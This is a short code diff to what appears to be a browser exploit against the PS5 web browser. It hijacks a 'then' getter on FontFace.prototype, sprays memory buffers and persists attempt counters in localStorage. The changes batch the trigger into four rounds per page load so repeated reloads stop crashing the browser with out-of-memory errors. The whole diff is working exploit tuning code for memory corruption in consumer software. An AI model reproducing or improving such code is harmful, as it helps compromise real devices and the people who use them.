@@ -20,6 +20,10 @@
 
   var SIZES = [96, 128, 160, 192, 224, 256, 320, 384, 448, 512, 640, 768, 1024, 1280, 1536];
   var N = 64;
+  // 4 rounds per page load: full-document reloads are what bloat the
+  // PS5 browser process into the console OOM error — same trigger,
+  // quarter the document churn.
+  var ROUNDS = 4;
 
   var k;
   try { k = parseInt(localStorage.getItem('p458mk') || '96', 10); } catch(e) { k = 96; }
@@ -41,6 +45,8 @@
 
   var OK = 'local(Helvetica)';
   var bufs = [];
+  // note: jfaces declared above; massclaim sprays buffers, not faces,
+  // so it stays empty here — kept for scan compatibility
 
   Object.defineProperty(FontFace.prototype, 'then', {
     get: function() {
@@ -68,6 +74,9 @@
     });
     return found;
   }
+
+  var roundIdx = 0;
+  var jfaces = [];
 
   function round0() {
     B('MK' + k + '-GO');
@@ -104,6 +113,11 @@
           runs = (parseInt(localStorage.getItem('p458runs') || '0', 10) + 1) % 40;
           localStorage.setItem('p458runs', String(runs));
         } catch(e) {}
+        roundIdx++;
+        if (roundIdx < ROUNDS) {
+          setTimeout(function() { round0(); }, 700);
+          return;
+        }
         if (runs === 0) {
           B('COOLDOWN-60s');
           hb.textContent = 'p458-massclaim COOLDOWN 60s (mem)';
